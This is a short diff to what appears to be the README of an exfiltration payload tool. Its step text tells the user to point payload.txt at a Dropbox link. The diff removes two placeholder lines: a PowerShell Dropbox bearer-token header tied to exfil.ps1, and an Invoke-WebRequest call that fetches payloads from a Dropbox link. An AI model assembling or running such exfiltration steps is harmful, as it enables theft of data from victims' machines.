@@ -13,7 +13,4 @@ Requirements
     Step 4. Customize the exfiltration payload.txt to use the dropbox link from above
 
 
-$authorization = "Bearer " + "PASTE YOUR Dropbox access token link" -exfil.ps1
-iwr (https:// PASTE YOUR Dropbox link) -payloads
-
 ![](./demo.gif)
